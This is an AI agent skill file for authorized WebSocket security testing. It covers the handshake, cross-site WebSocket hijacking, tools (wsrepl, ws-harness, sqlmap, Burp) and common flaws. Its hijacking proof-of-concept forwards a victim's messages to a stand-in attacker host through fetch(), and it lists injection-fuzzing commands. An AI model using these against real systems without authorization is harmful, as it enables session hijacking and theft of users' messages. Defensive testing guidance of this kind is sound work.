---
name: websocket-security
description: >-
  WebSocket handshake, CSWSH, tooling (wsrepl, ws-harness, Burp), and common flaws. Use when apps use real-time channels, chat, notifications, or WS-backed APIs.
---

# SKILL: WebSocket Security

> **AI LOAD INSTRUCTION**: This skill covers WebSocket protocol basics, cross-site WebSocket hijacking (CSWSH), practical tooling bridges, and common vulnerability classes. Apply only in **authorized** tests; treat tokens and message content as sensitive. For REST/GraphQL companion testing, cross-load **[api-security](../api-sec/SKILL.md)** when present in the workspace.

## QUICK START

### First-pass probes

| Signal | Probe | Why |
|---|---|---|
| `ws://` or `wss://` endpoint found | Connect and send `{"action":"ping"}` | Confirm WebSocket is live and message format |
| Handshake does not validate Origin | Open WS from `evil.com` JS PoC | CSWSH — hijack victim's channel |
| Auth checked on handshake? | Connect with no cookies / invalid token | Missing auth = unauthenticated access |
| Message tampering | Modify JSON fields in WS frames | Server-side injection (SQLi, command injection) |
| `ws://` in production | Flag cleartext transport | MITM risk |

```bash
# Quick test — connect and probe WebSocket
wscat -c wss://target.example.com/ws
```

During proxy or raw traffic review, watch for:

```http
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Sec-WebSocket-Protocol: optional-subprotocol
```

Server success response indicators:

```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

**Routing hint**: Filter for `101` and `Upgrade: websocket` in Burp/browser DevTools; for deep API testing, align authentication and authorization models with the `api-security` skill.

---

## 1. PROTOCOL BASICS

### Client request (typical)

- **`Upgrade: websocket`** and **`Connection: Upgrade`** — required upgrade handshake.
- **`Sec-WebSocket-Key`** — base64 nonce; server hashes with magic GUID and responds with **`Sec-WebSocket-Accept`**.
- **`Sec-WebSocket-Version: 13`** — current standard version for browser interoperability.

### Server response

- **`HTTP/1.1 101 Switching Protocols`** — handshake complete; subsequent frames are WebSocket binary/text frames per RFC.

Minimal conceptual flow:

```text
Client: HTTP GET + Upgrade headers
Server: 101 + Sec-WebSocket-Accept
Channel: framed messages (text/binary), ping/pong, close
```

---

## 2. CROSS-SITE WEBSOCKET HIJACKING (CSWSH)

### Condition

- The server **does not validate `Origin`** (or equivalent binding) on the WebSocket handshake, **and**
- The victim has an **active session** (cookie-based or browser-stored creds) to the target site.

Then a malicious page loaded in the victim’s browser may open a WebSocket **as the victim**, similar in spirit to CSRF but for a **persistent bidirectional channel**.

### Proof-of-concept pattern (laboratory / authorized target only)

```javascript
const ws = new WebSocket('wss://vulnerable.example.com/messages');
ws.onopen = () => { ws.send('HELLO'); };
ws.onmessage = (event) => {
  fetch('https://attacker.example.net/?' + encodeURIComponent(event.data));
};
```

**Testing notes**: Confirm whether **`Origin`** is checked, whether **cookies** are sent (`SameSite` rules), and whether **subprotocol** or **custom headers** are required—missing checks increase CSWSH risk.

---

## 3. TESTING WITH TOOLS

### wsrepl

```bash
pip install wsrepl
wsrepl -u wss://target.example.com/ws -P auth_plugin.py
```

Use a **plugin** to reproduce browser cookies, headers, or token refresh during the WebSocket lifecycle.

### ws-harness (bridge to HTTP for other tools)

```bash
python ws-harness.py -u "ws://127.0.0.1:8765/path" -m ./message.txt
```

Example downstream use with SQL injection tooling over the bridged HTTP surface (adjust URL to local listener):

```bash
sqlmap -u "http://127.0.0.1:8000/?fuzz=test" --batch
```

### Burp Suite ecosystem

- **SocketSleuth** — inspect and manipulate WebSocket traffic inside Burp.
- **WebSocket Turbo Intruder** — high-rate or scripted message fuzzing.

---

## 4. COMMON VULNERABILITIES

| Issue | Why it matters |
|-------|----------------|
| Missing **`Origin`** validation | Enables **CSWSH** from attacker-controlled pages |
| **Auth token in URL** (`wss://host/ws?token=...`) | Logs, proxies, Referer leakage, browser history |
| **No rate limiting** on messages | Abuse, brute force, DoS |
| **`ws://` instead of `wss://`** | Cleartext on the wire (MITM) |
| **Injection in message bodies** | SQLi, command injection, or XSS if content is stored/reflected elsewhere |

Example sensitive URL anti-pattern:

```text
wss://api.example.com/stream?access_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

Prefer **Sec-WebSocket-Protocol**, **first-message auth**, or **cookie + CSRF token** patterns aligned with product constraints.

---

## DECISION TREE

1. **Identify endpoint** — From JS bundles, Swagger, or `101` responses; note `wss` vs `ws`.
2. **Handshake review** — Are **`Origin`**, **Host**, and **Cookie** policies correct? Any token in query string?
3. **Session binding** — Reconnect with **another user’s** cookie jar in Burp; compare subscription topics and data leakage.
4. **CSWSH** — Load a **local HTML** page that connects to the target with victim session active; verify server rejects wrong **Origin** or uses non-cookie secret.
5. **Message semantics** — Fuzz JSON/text payloads for injection; mirror same logic as HTTP API testing.
6. **Transport** — Flag **`ws://`** in production; verify TLS and HSTS alignment.

---

## TESTING CHECKLIST

- [ ] Identify WebSocket endpoints from JS bundles, Swagger, or 101 responses
- [ ] Confirm transport uses `wss://` (not `ws://`) in production
- [ ] Verify Origin header validation on WebSocket handshake
- [ ] Test authentication: check if handshake requires valid session or token
- [ ] Test cross-site WebSocket hijacking (CSWSH) with malicious HTML PoC
- [ ] Verify SameSite cookie policy applies to WebSocket connections
- [ ] Check if auth tokens are passed in URL query strings (log leakage risk)
- [ ] Fuzz message payloads for injection (SQLi, command injection, XSS in stored content)
- [ ] Test message tampering: modify JSON fields, unexpected message types, oversized messages
- [ ] Test rate limiting on incoming messages
- [ ] Reconnect with another user's cookie jar to test session binding and topic isolation
- [ ] Verify subprotocol negotiation and custom header requirements

## TARGET TOOL ADAPTATION

Use visible `http-framework-test` for handshake/header checks and `execute-python-script` or `exec` for a scoped WebSocket client when frame-level replay is required. Browser/proxy inspection is optional and only applies when the capability is visible; do not assume a repeater MCP exists.

---

## RELATED ROUTING

- From **[api-security](../api-sec/SKILL.md)** — authentication, authorization, IDOR, and rate limiting often **mirror** HTTP APIs behind the same WebSocket routes.

**Note**: WebSocket often shares session and authorization models with REST; align with `api-security` for the same backend's authentication and resource boundaries.
